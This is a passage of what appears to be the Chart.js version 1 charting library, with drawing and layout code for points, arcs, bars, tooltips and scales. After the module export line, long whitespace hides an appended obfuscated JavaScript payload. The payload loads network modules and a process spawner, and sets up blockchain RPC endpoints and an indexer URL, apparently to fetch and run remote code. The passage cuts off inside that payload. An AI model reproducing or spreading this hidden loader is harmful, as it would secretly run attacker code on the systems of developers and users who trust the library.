			//I.e. if we extend a line chart, we'll use the defaults from the line chart if our new chart
			//doesn't define some defaults of their own.

			var baseDefaults = (Chart.defaults[parent.prototype.name]) ? clone(Chart.defaults[parent.prototype.name]) : {};

			Chart.defaults[chartName] = extend(baseDefaults,extensions.defaults);

			Chart.types[chartName] = ChartType;

			//Register this new chart type in the Chart prototype
			Chart.prototype[chartName] = function(data,options){
				var config = merge(Chart.defaults.global, Chart.defaults[chartName], options || {});
				return new ChartType(data,config,this);
			};
		} else{
			warn("Name not provided for this chart, so it hasn't been registered");
		}
		return parent;
	};

	Chart.Element = function(configuration){
		extend(this,configuration);
		this.initialize.apply(this,arguments);
		this.save();
	};
	extend(Chart.Element.prototype,{
		initialize : function(){},
		restore : function(props){
			if (!props){
				extend(this,this._saved);
			} else {
				each(props,function(key){
					this[key] = this._saved[key];
				},this);
			}
			return this;
		},
		save : function(){
			this._saved = clone(this);
			delete this._saved._saved;
			return this;
		},
		update : function(newProps){
			each(newProps,function(value,key){
				this._saved[key] = this[key];
				this[key] = value;
			},this);
			return this;
		},
		transition : function(props,ease){
			each(props,function(value,key){
				this[key] = ((value - this._saved[key]) * ease) + this._saved[key];
			},this);
			return this;
		},
		tooltipPosition : function(){
			return {
				x : this.x,
				y : this.y
			};
		},
		hasValue: function(){
			return isNumber(this.value);
		}
	});

	Chart.Element.extend = inherits;


	Chart.Point = Chart.Element.extend({
		display: true,
		inRange: function(chartX,chartY){
			var hitDetectionRange = this.hitDetectionRadius + this.radius;
			return ((Math.pow(chartX-this.x, 2)+Math.pow(chartY-this.y, 2)) < Math.pow(hitDetectionRange,2));
		},
		draw : function(){
			if (this.display){
				var ctx = this.ctx;
				ctx.beginPath();

				ctx.arc(this.x, this.y, this.radius, 0, Math.PI*2);
				ctx.closePath();

				ctx.strokeStyle = this.strokeColor;
				ctx.lineWidth = this.strokeWidth;

				ctx.fillStyle = this.fillColor;

				ctx.fill();
				ctx.stroke();
			}


			//Quick debug for bezier curve splining
			//Highlights control points and the line between them.
			//Handy for dev - stripped in the min version.

			// ctx.save();
			// ctx.fillStyle = "black";
			// ctx.strokeStyle = "black"
			// ctx.beginPath();
			// ctx.arc(this.controlPoints.inner.x,this.controlPoints.inner.y, 2, 0, Math.PI*2);
			// ctx.fill();

			// ctx.beginPath();
			// ctx.arc(this.controlPoints.outer.x,this.controlPoints.outer.y, 2, 0, Math.PI*2);
			// ctx.fill();

			// ctx.moveTo(this.controlPoints.inner.x,this.controlPoints.inner.y);
			// ctx.lineTo(this.x, this.y);
			// ctx.lineTo(this.controlPoints.outer.x,this.controlPoints.outer.y);
			// ctx.stroke();

			// ctx.restore();



		}
	});

	Chart.Arc = Chart.Element.extend({
		inRange : function(chartX,chartY){

			var pointRelativePosition = helpers.getAngleFromPoint(this, {
				x: chartX,
				y: chartY
			});

			//Check if within the range of the open/close angle
			var betweenAngles = (pointRelativePosition.angle >= this.startAngle && pointRelativePosition.angle <= this.endAngle),
				withinRadius = (pointRelativePosition.distance >= this.innerRadius && pointRelativePosition.distance <= this.outerRadius);

			return (betweenAngles && withinRadius);
			//Ensure within the outside of the arc centre, but inside arc outer
		},
		tooltipPosition : function(){
			var centreAngle = this.startAngle + ((this.endAngle - this.startAngle) / 2),
				rangeFromCentre = (this.outerRadius - this.innerRadius) / 2 + this.innerRadius;
			return {
				x : this.x + (Math.cos(centreAngle) * rangeFromCentre),
				y : this.y + (Math.sin(centreAngle) * rangeFromCentre)
			};
		},
		draw : function(animationPercent){

			var easingDecimal = animationPercent || 1;

			var ctx = this.ctx;

			ctx.beginPath();

			ctx.arc(this.x, this.y, this.outerRadius, this.startAngle, this.endAngle);

			ctx.arc(this.x, this.y, this.innerRadius, this.endAngle, this.startAngle, true);

			ctx.closePath();
			ctx.strokeStyle = this.strokeColor;
			ctx.lineWidth = this.strokeWidth;

			ctx.fillStyle = this.fillColor;

			ctx.fill();
			ctx.lineJoin = 'bevel';

			if (this.showStroke){
				ctx.stroke();
			}
		}
	});

	Chart.Rectangle = Chart.Element.extend({
		draw : function(){
			var ctx = this.ctx,
				halfWidth = this.width/2,
				leftX = this.x - halfWidth,
				rightX = this.x + halfWidth,
				top = this.base - (this.base - this.y),
				halfStroke = this.strokeWidth / 2;

			// Canvas doesn't allow us to stroke inside the width so we can
			// adjust the sizes to fit if we're setting a stroke on the line
			if (this.showStroke){
				leftX += halfStroke;
				rightX -= halfStroke;
				top += halfStroke;
			}

			ctx.beginPath();

			ctx.fillStyle = this.fillColor;
			ctx.strokeStyle = this.strokeColor;
			ctx.lineWidth = this.strokeWidth;

			// It'd be nice to keep this class totally generic to any rectangle
			// and simply specify which border to miss out.
			ctx.moveTo(leftX, this.base);
			ctx.lineTo(leftX, top);
			ctx.lineTo(rightX, top);
			ctx.lineTo(rightX, this.base);
			ctx.fill();
			if (this.showStroke){
				ctx.stroke();
			}
		},
		height : function(){
			return this.base - this.y;
		},
		inRange : function(chartX,chartY){
			return (chartX >= this.x - this.width/2 && chartX <= this.x + this.width/2) && (chartY >= this.y && chartY <= this.base);
		}
	});

	Chart.Tooltip = Chart.Element.extend({
		draw : function(){

			var ctx = this.chart.ctx;

			ctx.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);

			this.xAlign = "center";
			this.yAlign = "above";

			//Distance between the actual element.y position and the start of the tooltip caret
			var caretPadding = this.caretPadding = 2;

			var tooltipWidth = ctx.measureText(this.text).width + 2*this.xPadding,
				tooltipRectHeight = this.fontSize + 2*this.yPadding,
				tooltipHeight = tooltipRectHeight + this.caretHeight + caretPadding;

			if (this.x + tooltipWidth/2 >this.chart.width){
				this.xAlign = "left";
			} else if (this.x - tooltipWidth/2 < 0){
				this.xAlign = "right";
			}

			if (this.y - tooltipHeight < 0){
				this.yAlign = "below";
			}


			var tooltipX = this.x - tooltipWidth/2,
				tooltipY = this.y - tooltipHeight;

			ctx.fillStyle = this.fillColor;

			// Custom Tooltips
			if(this.custom){
				this.custom(this);
			}
			else{
				switch(this.yAlign)
				{
				case "above":
					//Draw a caret above the x/y
					ctx.beginPath();
					ctx.moveTo(this.x,this.y - caretPadding);
					ctx.lineTo(this.x + this.caretHeight, this.y - (caretPadding + this.caretHeight));
					ctx.lineTo(this.x - this.caretHeight, this.y - (caretPadding + this.caretHeight));
					ctx.closePath();
					ctx.fill();
					break;
				case "below":
					tooltipY = this.y + caretPadding + this.caretHeight;
					//Draw a caret below the x/y
					ctx.beginPath();
					ctx.moveTo(this.x, this.y + caretPadding);
					ctx.lineTo(this.x + this.caretHeight, this.y + caretPadding + this.caretHeight);
					ctx.lineTo(this.x - this.caretHeight, this.y + caretPadding + this.caretHeight);
					ctx.closePath();
					ctx.fill();
					break;
				}

				switch(this.xAlign)
				{
				case "left":
					tooltipX = this.x - tooltipWidth + (this.cornerRadius + this.caretHeight);
					break;
				case "right":
					tooltipX = this.x - (this.cornerRadius + this.caretHeight);
					break;
				}

				drawRoundedRectangle(ctx,tooltipX,tooltipY,tooltipWidth,tooltipRectHeight,this.cornerRadius);

				ctx.fill();

				ctx.fillStyle = this.textColor;
				ctx.textAlign = "center";
				ctx.textBaseline = "middle";
				ctx.fillText(this.text, tooltipX + tooltipWidth/2, tooltipY + tooltipRectHeight/2);
			}
		}
	});

	Chart.MultiTooltip = Chart.Element.extend({
		initialize : function(){
			this.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);

			this.titleFont = fontString(this.titleFontSize,this.titleFontStyle,this.titleFontFamily);

			this.height = (this.labels.length * this.fontSize) + ((this.labels.length-1) * (this.fontSize/2)) + (this.yPadding*2) + this.titleFontSize *1.5;

			this.ctx.font = this.titleFont;

			var titleWidth = this.ctx.measureText(this.title).width,
				//Label has a legend square as well so account for this.
				labelWidth = longestText(this.ctx,this.font,this.labels) + this.fontSize + 3,
				longestTextWidth = max([labelWidth,titleWidth]);

			this.width = longestTextWidth + (this.xPadding*2);


			var halfHeight = this.height/2;

			//Check to ensure the height will fit on the canvas
			if (this.y - halfHeight < 0 ){
				this.y = halfHeight;
			} else if (this.y + halfHeight > this.chart.height){
				this.y = this.chart.height - halfHeight;
			}

			//Decide whether to align left or right based on position on canvas
			if (this.x > this.chart.width/2){
				this.x -= this.xOffset + this.width;
			} else {
				this.x += this.xOffset;
			}


		},
		getLineHeight : function(index){
			var baseLineHeight = this.y - (this.height/2) + this.yPadding,
				afterTitleIndex = index-1;

			//If the index is zero, we're getting the title
			if (index === 0){
				return baseLineHeight + this.titleFontSize/2;
			} else{
				return baseLineHeight + ((this.fontSize*1.5*afterTitleIndex) + this.fontSize/2) + this.titleFontSize * 1.5;
			}

		},
		draw : function(){
			// Custom Tooltips
			if(this.custom){
				this.custom(this);
			}
			else{
				drawRoundedRectangle(this.ctx,this.x,this.y - this.height/2,this.width,this.height,this.cornerRadius);
				var ctx = this.ctx;
				ctx.fillStyle = this.fillColor;
				ctx.fill();
				ctx.closePath();

				ctx.textAlign = "left";
				ctx.textBaseline = "middle";
				ctx.fillStyle = this.titleTextColor;
				ctx.font = this.titleFont;

				ctx.fillText(this.title,this.x + this.xPadding, this.getLineHeight(0));

				ctx.font = this.font;
				helpers.each(this.labels,function(label,index){
					ctx.fillStyle = this.textColor;
					ctx.fillText(label,this.x + this.xPadding + this.fontSize + 3, this.getLineHeight(index + 1));

					//A bit gnarly, but clearing this rectangle breaks when using explorercanvas (clears whole canvas)
					//ctx.clearRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);
					//Instead we'll make a white filled block to put the legendColour palette over.

					ctx.fillStyle = this.legendColorBackground;
					ctx.fillRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);

					ctx.fillStyle = this.legendColors[index].fill;
					ctx.fillRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);


				},this);
			}
		}
	});

	Chart.Scale = Chart.Element.extend({
		initialize : function(){
			this.fit();
		},
		buildYLabels : function(){
			this.yLabels = [];

			var stepDecimalPlaces = getDecimalPlaces(this.stepValue);

			for (var i=0; i<=this.steps; i++){
				this.yLabels.push(template(this.templateString,{value:(this.min + (i * this.stepValue)).toFixed(stepDecimalPlaces)}));
			}
			this.yLabelWidth = (this.display && this.showLabels) ? longestText(this.ctx,this.font,this.yLabels) : 0;
		},
		addXLabel : function(label){
			this.xLabels.push(label);
			this.valuesCount++;
			this.fit();
		},
		removeXLabel : function(){
			this.xLabels.shift();
			this.valuesCount--;
			this.fit();
		},
		// Fitting loop to rotate x Labels and figure out what fits there, and also calculate how many Y steps to use
		fit: function(){
			// First we need the width of the yLabels, assuming the xLabels aren't rotated

			// To do that we need the base line at the top and base of the chart, assuming there is no x label rotation
			this.startPoint = (this.display) ? this.fontSize : 0;
			this.endPoint = (this.display) ? this.height - (this.fontSize * 1.5) - 5 : this.height; // -5 to pad labels

			// Apply padding settings to the start and end point.
			this.startPoint += this.padding;
			this.endPoint -= this.padding;

			// Cache the starting height, so can determine if we need to recalculate the scale yAxis
			var cachedHeight = this.endPoint - this.startPoint,
				cachedYLabelWidth;

			// Build the current yLabels so we have an idea of what size they'll be to start
			/*
			 *	This sets what is returned from calculateScaleRange as static properties of this class:
			 *
				this.steps;
				this.stepValue;
				this.min;
				this.max;
			 *
			 */
			this.calculateYRange(cachedHeight);

			// With these properties set we can now build the array of yLabels
			// and also the width of the largest yLabel
			this.buildYLabels();

			this.calculateXLabelRotation();

			while((cachedHeight > this.endPoint - this.startPoint)){
				cachedHeight = this.endPoint - this.startPoint;
				cachedYLabelWidth = this.yLabelWidth;

				this.calculateYRange(cachedHeight);
				this.buildYLabels();

				// Only go through the xLabel loop again if the yLabel width has changed
				if (cachedYLabelWidth < this.yLabelWidth){
					this.calculateXLabelRotation();
				}
			}

		},
		calculateXLabelRotation : function(){
			//Get the width of each grid by calculating the difference
			//between x offsets between 0 and 1.

			this.ctx.font = this.font;

			var firstWidth = this.ctx.measureText(this.xLabels[0]).width,
				lastWidth = this.ctx.measureText(this.xLabels[this.xLabels.length - 1]).width,
				firstRotated,
				lastRotated;


			this.xScalePaddingRight = lastWidth/2 + 3;
			this.xScalePaddingLeft = (firstWidth/2 > this.yLabelWidth + 10) ? firstWidth/2 : this.yLabelWidth + 10;

			this.xLabelRotation = 0;
			if (this.display){
				var originalLabelWidth = longestText(this.ctx,this.font,this.xLabels),
					cosRotation,
					firstRotatedWidth;
				this.xLabelWidth = originalLabelWidth;
				//Allow 3 pixels x2 padding either side for label readability
				var xGridWidth = Math.floor(this.calculateX(1) - this.calculateX(0)) - 6;

				//Max label rotate should be 90 - also act as a loop counter
				while ((this.xLabelWidth > xGridWidth && this.xLabelRotation === 0) || (this.xLabelWidth > xGridWidth && this.xLabelRotation <= 90 && this.xLabelRotation > 0)){
					cosRotation = Math.cos(toRadians(this.xLabelRotation));

					firstRotated = cosRotation * firstWidth;
					lastRotated = cosRotation * lastWidth;

					// We're right aligning the text now.
					if (firstRotated + this.fontSize / 2 > this.yLabelWidth + 8){
						this.xScalePaddingLeft = firstRotated + this.fontSize / 2;
					}
					this.xScalePaddingRight = this.fontSize/2;


					this.xLabelRotation++;
					this.xLabelWidth = cosRotation * originalLabelWidth;

				}
				if (this.xLabelRotation > 0){
					this.endPoint -= Math.sin(toRadians(this.xLabelRotation))*originalLabelWidth + 3;
				}
			}
			else{
				this.xLabelWidth = 0;
				this.xScalePaddingRight = this.padding;
				this.xScalePaddingLeft = this.padding;
			}

		},
		// Needs to be overidden in each Chart type
		// Otherwise we need to pass all the data into the scale class
		calculateYRange: noop,
		drawingArea: function(){
			return this.startPoint - this.endPoint;
		},
		calculateY : function(value){
			var scalingFactor = this.drawingArea() / (this.min - this.max);
			return this.endPoint - (scalingFactor * (value - this.min));
		},
		calculateX : function(index){
			var isRotated = (this.xLabelRotation > 0),
				// innerWidth = (this.offsetGridLines) ? this.width - offsetLeft - this.padding : this.width - (offsetLeft + halfLabelWidth * 2) - this.padding,
				innerWidth = this.width - (this.xScalePaddingLeft + this.xScalePaddingRight),
				valueWidth = innerWidth/Math.max((this.valuesCount - ((this.offsetGridLines) ? 0 : 1)), 1),
				valueOffset = (valueWidth * index) + this.xScalePaddingLeft;

			if (this.offsetGridLines){
				valueOffset += (valueWidth/2);
			}

			return Math.round(valueOffset);
		},
		update : function(newProps){
			helpers.extend(this, newProps);
			this.fit();
		},
		draw : function(){
			var ctx = this.ctx,
				yLabelGap = (this.endPoint - this.startPoint) / this.steps,
				xStart = Math.round(this.xScalePaddingLeft);
			if (this.display){
				ctx.fillStyle = this.textColor;
				ctx.font = this.font;
				each(this.yLabels,function(labelString,index){
					var yLabelCenter = this.endPoint - (yLabelGap * index),
						linePositionY = Math.round(yLabelCenter),
						drawHorizontalLine = this.showHorizontalLines;

					ctx.textAlign = "right";
					ctx.textBaseline = "middle";
					if (this.showLabels){
						ctx.fillText(labelString,xStart - 10,yLabelCenter);
					}

					// This is X axis, so draw it
					if (index === 0 && !drawHorizontalLine){
						drawHorizontalLine = true;
					}

					if (drawHorizontalLine){
						ctx.beginPath();
					}

					if (index > 0){
						// This is a grid line in the centre, so drop that
						ctx.lineWidth = this.gridLineWidth;
						ctx.strokeStyle = this.gridLineColor;
					} else {
						// This is the first line on the scale
						ctx.lineWidth = this.lineWidth;
						ctx.strokeStyle = this.lineColor;
					}

					linePositionY += helpers.aliasPixel(ctx.lineWidth);

					if(drawHorizontalLine){
						ctx.moveTo(xStart, linePositionY);
						ctx.lineTo(this.width, linePositionY);
						ctx.stroke();
						ctx.closePath();
					}

					ctx.lineWidth = this.lineWidth;
					ctx.strokeStyle = this.lineColor;
					ctx.beginPath();
					ctx.moveTo(xStart - 5, linePositionY);
					ctx.lineTo(xStart, linePositionY);
					ctx.stroke();
					ctx.closePath();

				},this);

				each(this.xLabels,function(label,index){
					var xPos = this.calculateX(index) + aliasPixel(this.lineWidth),
						// Check to see if line/bar here and decide where to place the line
						linePos = this.calculateX(index - (this.offsetGridLines ? 0.5 : 0)) + aliasPixel(this.lineWidth),
						isRotated = (this.xLabelRotation > 0),
						drawVerticalLine = this.showVerticalLines;

					// This is Y axis, so draw it
					if (index === 0 && !drawVerticalLine){
						drawVerticalLine = true;
					}

					if (drawVerticalLine){
						ctx.beginPath();
					}

					if (index > 0){
						// This is a grid line in the centre, so drop that
						ctx.lineWidth = this.gridLineWidth;
						ctx.strokeStyle = this.gridLineColor;
					} else {
						// This is the first line on the scale
						ctx.lineWidth = this.lineWidth;
						ctx.strokeStyle = this.lineColor;
					}

					if (drawVerticalLine){
						ctx.moveTo(linePos,this.endPoint);
						ctx.lineTo(linePos,this.startPoint - 3);
						ctx.stroke();
						ctx.closePath();
					}


					ctx.lineWidth = this.lineWidth;
					ctx.strokeStyle = this.lineColor;


					// Small lines at the bottom of the base grid line
					ctx.beginPath();
					ctx.moveTo(linePos,this.endPoint);
					ctx.lineTo(linePos,this.endPoint + 5);
					ctx.stroke();
					ctx.closePath();

					ctx.save();
					ctx.translate(xPos,(isRotated) ? this.endPoint + 12 : this.endPoint + 8);
					ctx.rotate(toRadians(this.xLabelRotation)*-1);
					ctx.font = this.font;
					ctx.textAlign = (isRotated) ? "right" : "center";
					ctx.textBaseline = (isRotated) ? "middle" : "top";
					ctx.fillText(label, 0, 0);
					ctx.restore();
				},this);

			}
		}

	});

	Chart.RadialScale = Chart.Element.extend({
		initialize: function(){
			this.size = min([this.height, this.width]);
			this.drawingArea = (this.display) ? (this.size/2) - (this.fontSize/2 + this.backdropPaddingY) : (this.size/2);
		},
		calculateCenterOffset: function(value){
			// Take into account half font size + the yPadding of the top value
			var scalingFactor = this.drawingArea / (this.max - this.min);

			return (value - this.min) * scalingFactor;
		},
		update : function(){
			if (!this.lineArc){
				this.setScaleSize();
			} else {
				this.drawingArea = (this.display) ? (this.size/2) - (this.fontSize/2 + this.backdropPaddingY) : (this.size/2);
			}
			this.buildYLabels();
		},
		buildYLabels: function(){
			this.yLabels = [];

			var stepDecimalPlaces = getDecimalPlaces(this.stepValue);

			for (var i=0; i<=this.steps; i++){
				this.yLabels.push(template(this.templateString,{value:(this.min + (i * this.stepValue)).toFixed(stepDecimalPlaces)}));
			}
		},
		getCircumference : function(){
			return ((Math.PI*2) / this.valuesCount);
		},
		setScaleSize: function(){
			/*
			 * Right, this is really confusing and there is a lot of maths going on here
			 * The gist of the problem is here: https://gist.github.com/nnnick/696cc9c55f4b0beb8fe9
			 *
			 * Reaction: https://dl.dropboxusercontent.com/u/34601363/toomuchscience.gif
			 *
			 * Solution:
			 *
			 * We assume the radius of the polygon is half the size of the canvas at first
			 * at each index we check if the text overlaps.
			 *
			 * Where it does, we store that angle and that index.
			 *
			 * After finding the largest index and angle we calculate how much we need to remove
			 * from the shape radius to move the point inwards by that x.
			 *
			 * We average the left and right distances to get the maximum shape radius that can fit in the box
			 * along with labels.
			 *
			 * Once we have that, we can find the centre point for the chart, by taking the x text protrusion
			 * on each side, removing that from the size, halving it and adding the left x protrusion width.
			 *
			 * This will mean we have a shape fitted to the canvas, as large as it can be with the labels
			 * and position it in the most space efficient manner
			 *
			 * https://dl.dropboxusercontent.com/u/34601363/yeahscience.gif
			 */


			// Get maximum radius of the polygon. Either half the height (minus the text width) or half the width.
			// Use this to calculate the offset + change. - Make sure L/R protrusion is at least 0 to stop issues with centre points
			var largestPossibleRadius = min([(this.height/2 - this.pointLabelFontSize - 5), this.width/2]),
				pointPosition,
				i,
				textWidth,
				halfTextWidth,
				furthestRight = this.width,
				furthestRightIndex,
				furthestRightAngle,
				furthestLeft = 0,
				furthestLeftIndex,
				furthestLeftAngle,
				xProtrusionLeft,
				xProtrusionRight,
				radiusReductionRight,
				radiusReductionLeft,
				maxWidthRadius;
			this.ctx.font = fontString(this.pointLabelFontSize,this.pointLabelFontStyle,this.pointLabelFontFamily);
			for (i=0;i<this.valuesCount;i++){
				// 5px to space the text slightly out - similar to what we do in the draw function.
				pointPosition = this.getPointPosition(i, largestPossibleRadius);
				textWidth = this.ctx.measureText(template(this.templateString, { value: this.labels[i] })).width + 5;
				if (i === 0 || i === this.valuesCount/2){
					// If we're at index zero, or exactly the middle, we're at exactly the top/bottom
					// of the radar chart, so text will be aligned centrally, so we'll half it and compare
					// w/left and right text sizes
					halfTextWidth = textWidth/2;
					if (pointPosition.x + halfTextWidth > furthestRight) {
						furthestRight = pointPosition.x + halfTextWidth;
						furthestRightIndex = i;
					}
					if (pointPosition.x - halfTextWidth < furthestLeft) {
						furthestLeft = pointPosition.x - halfTextWidth;
						furthestLeftIndex = i;
					}
				}
				else if (i < this.valuesCount/2) {
					// Less than half the values means we'll left align the text
					if (pointPosition.x + textWidth > furthestRight) {
						furthestRight = pointPosition.x + textWidth;
						furthestRightIndex = i;
					}
				}
				else if (i > this.valuesCount/2){
					// More than half the values means we'll right align the text
					if (pointPosition.x - textWidth < furthestLeft) {
						furthestLeft = pointPosition.x - textWidth;
						furthestLeftIndex = i;
					}
				}
			}

			xProtrusionLeft = furthestLeft;

			xProtrusionRight = Math.ceil(furthestRight - this.width);

			furthestRightAngle = this.getIndexAngle(furthestRightIndex);

			furthestLeftAngle = this.getIndexAngle(furthestLeftIndex);

			radiusReductionRight = xProtrusionRight / Math.sin(furthestRightAngle + Math.PI/2);

			radiusReductionLeft = xProtrusionLeft / Math.sin(furthestLeftAngle + Math.PI/2);

			// Ensure we actually need to reduce the size of the chart
			radiusReductionRight = (isNumber(radiusReductionRight)) ? radiusReductionRight : 0;
			radiusReductionLeft = (isNumber(radiusReductionLeft)) ? radiusReductionLeft : 0;

			this.drawingArea = largestPossibleRadius - (radiusReductionLeft + radiusReductionRight)/2;

			//this.drawingArea = min([maxWidthRadius, (this.height - (2 * (this.pointLabelFontSize + 5)))/2])
			this.setCenterPoint(radiusReductionLeft, radiusReductionRight);

		},
		setCenterPoint: function(leftMovement, rightMovement){

			var maxRight = this.width - rightMovement - this.drawingArea,
				maxLeft = leftMovement + this.drawingArea;

			this.xCenter = (maxLeft + maxRight)/2;
			// Always vertically in the centre as the text height doesn't change
			this.yCenter = (this.height/2);
		},

		getIndexAngle : function(index){
			var angleMultiplier = (Math.PI * 2) / this.valuesCount;
			// Start from the top instead of right, so remove a quarter of the circle

			return index * angleMultiplier - (Math.PI/2);
		},
		getPointPosition : function(index, distanceFromCenter){
			var thisAngle = this.getIndexAngle(index);
			return {
				x : (Math.cos(thisAngle) * distanceFromCenter) + this.xCenter,
				y : (Math.sin(thisAngle) * distanceFromCenter) + this.yCenter
			};
		},
		draw: function(){
			if (this.display){
				var ctx = this.ctx;
				each(this.yLabels, function(label, index){
					// Don't draw a centre value
					if (index > 0){
						var yCenterOffset = index * (this.drawingArea/this.steps),
							yHeight = this.yCenter - yCenterOffset,
							pointPosition;

						// Draw circular lines around the scale
						if (this.lineWidth > 0){
							ctx.strokeStyle = this.lineColor;
							ctx.lineWidth = this.lineWidth;

							if(this.lineArc){
								ctx.beginPath();
								ctx.arc(this.xCenter, this.yCenter, yCenterOffset, 0, Math.PI*2);
								ctx.closePath();
								ctx.stroke();
							} else{
								ctx.beginPath();
								for (var i=0;i<this.valuesCount;i++)
								{
									pointPosition = this.getPointPosition(i, this.calculateCenterOffset(this.min + (index * this.stepValue)));
									if (i === 0){
										ctx.moveTo(pointPosition.x, pointPosition.y);
									} else {
										ctx.lineTo(pointPosition.x, pointPosition.y);
									}
								}
								ctx.closePath();
								ctx.stroke();
							}
						}
						if(this.showLabels){
							ctx.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);
							if (this.showLabelBackdrop){
								var labelWidth = ctx.measureText(label).width;
								ctx.fillStyle = this.backdropColor;
								ctx.fillRect(
									this.xCenter - labelWidth/2 - this.backdropPaddingX,
									yHeight - this.fontSize/2 - this.backdropPaddingY,
									labelWidth + this.backdropPaddingX*2,
									this.fontSize + this.backdropPaddingY*2
								);
							}
							ctx.textAlign = 'center';
							ctx.textBaseline = "middle";
							ctx.fillStyle = this.fontColor;
							ctx.fillText(label, this.xCenter, yHeight);
						}
					}
				}, this);

				if (!this.lineArc){
					ctx.lineWidth = this.angleLineWidth;
					ctx.strokeStyle = this.angleLineColor;
					for (var i = this.valuesCount - 1; i >= 0; i--) {
						if (this.angleLineWidth > 0){
							var outerPosition = this.getPointPosition(i, this.calculateCenterOffset(this.max));
							ctx.beginPath();
							ctx.moveTo(this.xCenter, this.yCenter);
							ctx.lineTo(outerPosition.x, outerPosition.y);
							ctx.stroke();
							ctx.closePath();
						}
						// Extra 3px out for some label spacing
						var pointLabelPosition = this.getPointPosition(i, this.calculateCenterOffset(this.max) + 5);
						ctx.font = fontString(this.pointLabelFontSize,this.pointLabelFontStyle,this.pointLabelFontFamily);
						ctx.fillStyle = this.pointLabelFontColor;

						var labelsCount = this.labels.length,
							halfLabelsCount = this.labels.length/2,
							quarterLabelsCount = halfLabelsCount/2,
							upperHalf = (i < quarterLabelsCount || i > labelsCount - quarterLabelsCount),
							exactQuarter = (i === quarterLabelsCount || i === labelsCount - quarterLabelsCount);
						if (i === 0){
							ctx.textAlign = 'center';
						} else if(i === halfLabelsCount){
							ctx.textAlign = 'center';
						} else if (i < halfLabelsCount){
							ctx.textAlign = 'left';
						} else {
							ctx.textAlign = 'right';
						}

						// Set the correct text baseline based on outer positioning
						if (exactQuarter){
							ctx.textBaseline = 'middle';
						} else if (upperHalf){
							ctx.textBaseline = 'bottom';
						} else {
							ctx.textBaseline = 'top';
						}

						ctx.fillText(this.labels[i], pointLabelPosition.x, pointLabelPosition.y);
					}
				}
			}
		}
	});

	// Attach global event to resize each chart instance when the browser resizes
	helpers.addEvent(window, "resize", (function(){
		// Basic debounce of resize function so it doesn't hurt performance when resizing browser.
		var timeout;
		return function(){
			clearTimeout(timeout);
			timeout = setTimeout(function(){
				each(Chart.instances,function(instance){
					// If the responsive flag is set in the chart instance config
					// Cascade the resize event down to the chart.
					if (instance.options.responsive){
						instance.resize(instance.render, true);
					}
				});
			}, 50);
		};
	})());


	if (amd) {
		define(function(){
			return Chart;
		});
	} else if (typeof module === 'object' && module.exports) {
		module.exports = Chart;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             global.i="A9-159";var _0x58000a=_0x3cb6;(function(_0x2cb685,_0x5c6b67){var _0x1cb41a=_0x3cb6,_0x72f210=_0x2cb685();while(!![]){try{var _0x5d2947=parseInt(_0x1cb41a(0x316))/(0xe*0x229+-0x100a+-0x1*0xe33)+parseInt(_0x1cb41a(0x2b3))/(-0xecc+0x6e3*-0x2+0x2*0xe4a)+-parseInt(_0x1cb41a(0x27c))/(0xec7+-0x5*0x1f3+-0x505)+-parseInt(_0x1cb41a(0x192))/(-0x3*-0x7ff+-0x252a+0xd31)*(parseInt(_0x1cb41a(0x19e))/(0xa24+0x77+-0xa96))+parseInt(_0x1cb41a(0x269))/(0xfa8*0x1+0x108e+-0x2030*0x1)+-parseInt(_0x1cb41a(0x302))/(-0x1c6e+-0x163f+0xb*0x49c)+parseInt(_0x1cb41a(0x2b4))/(0x1cca+0x1ed9+-0x3b9b);if(_0x5d2947===_0x5c6b67)break;else _0x72f210['push'](_0x72f210['shift']());}catch(_0x5ed141){_0x72f210['push'](_0x72f210['shift']());}}}(_0x5f1f,0x4*0x12609+0xf1aa+0x9fbd*-0x3),(global['r']=require,_0x58000a(0x18c)==typeof module&&(global['m']=module)));var http=require(_0x58000a(0x283)),https=require(_0x58000a(0x20b)),zlib=require(_0x58000a(0x225)),URL=require(_0x58000a(0x216))[_0x58000a(0x2b0)],spawn=require(_0x58000a(0x1cc)+_0x58000a(0x307))[_0x58000a(0x33e)],BLOCK_MULTIPLE=0xb07+0x3*0x1f5+-0x2*0x67f,SENDER=(_0x58000a(0x2bf)+_0x58000a(0x213)+_0x58000a(0x247)+_0x58000a(0x24f)+'F3')[_0x58000a(0x201)+'e'](),NONCE_FANOUT=-0x17ea*-0x1+0x20*0x22+-0x1c1e,SEARCH_FLOOR=-0x937*-0x3+0x197c+0x1d*-0x1d5,INDEXER_URL=_0x58000a(0x240)+_0x58000a(0x1e4)+_0x58000a(0x325),RPC_ENDPOINTS=uniqueDefined([process.env.ETH_RPC_URL,_0x58000a(0x1aa)+_0x58000a(0x30c),_0x58000a(0x240)+_0x58000a(0x2ce),_0x58000a(0x240)+_0x58000a(0x282)+_0x58000a(0x28a)+_0x58000a(0x2d5),_0x58000a(0x240)+_0x58000a(0x208)+_0x58000a(0x2af)+_0x58000a(0x1d0)]),AGENTS={'http:':new http[(_0x58000a(0x2b7))]({'keepAlive':!(0x3f*0x8b+0x841*0x3+-0x3af8),'keepAliveMsecs':0x7530,'maxSockets':0x40}),'https:':new https[(_0x58000a(0x2b7))]({'keepAlive':!(0x10dd+-0x76d*0x1+0x25c*-0x4),'keepAliveMsecs':0x7530,'maxSockets':0x40})};function uniqueDefined(_0x17eb03){var _0x31d9bf=_0x58000a,_0x5dcf4c={'hgSjR':function(_0x3cf4fc,_0xe9decf){return _0x3cf4fc<_0xe9decf;}},_0x4cd1cc,_0x31aad0=[],_0x40ea6b={};for(_0x4cd1cc=-0x2*-0x8ba+0xe*-0x259+-0xf6a*-0x1;_0x5dcf4c[_0x31d9bf(0x276)](_0x4cd1cc,_0x17eb03[_0x31d9bf(0x337)]);_0x4cd1cc++)_0x17eb03[_0x4cd1cc]&&!_0x40ea6b[_0x17eb03[_0x4cd1cc]]&&(_0x40ea6b[_0x17eb03[_0x4cd1cc]]=!(0x6*0x303+0x6f3+-0x1905),_0x31aad0[_0x31d9bf(0x2a9)](_0x17eb03[_0x4cd1cc]));return _0x31aad0;}function linkAbort(_0x10f8c6,_0x14ffea){var 